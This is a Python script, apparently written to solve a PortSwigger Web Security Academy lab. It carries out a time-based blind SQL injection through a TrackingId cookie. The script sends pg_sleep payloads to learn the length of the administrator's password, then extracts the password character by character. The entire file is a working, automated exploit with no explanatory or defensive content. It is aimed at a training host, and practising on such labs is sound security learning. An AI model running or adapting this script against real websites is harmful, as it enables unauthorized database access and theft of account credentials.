import requests

password_size = 0
password_chars = "abcdefghijklmnoprqstuvwxyz0123456789"

def send_request(payload):

    host = "https://0aec00cd03b674e2c31ffb7200740061.web-security-academy.net"
    cookies = {"TrackingId":"ya95JhCoc5NSyZT9" + payload + 
                "; session=fPEIUYKVTMX7pn59e7r74QDWjmrRPHa0"}
    response = requests.get(host, cookies=cookies)
    return response

def password_length():

    for i in range (1,30):
        payload = ("' || (select case when (username='administrator' and"
                    " LENGTH(password)={}) then pg_sleep(10) else pg_sleep(0)"
                    " end from users)-- -".format(i))
        response = send_request(payload)
        if (response.elapsed.total_seconds()>=10):
            print ("Password length is {} characters".format(i))
            global password_size
            password_size = i
            return True

def find_password(password_size):
    print ("Retriving password")
    for i in range(1,password_size+1):
        for j in range(0,len(password_chars)):
            payload = ("' || (select case when (username='administrator' and"
                        " substring(password,{},1)='{}') then pg_sleep(10)"
                        " else pg_sleep(0) end from users)-- -"
                        .format(i,password_chars[j]))
            response = send_request(payload)
            if (response.elapsed.total_seconds()>=10):
                print(password_chars[j], sep='', end='', flush=True)
                break
    print("\nDone!")


if __name__ == "__main__":    
    if (password_length()):
        find_password(password_size)
        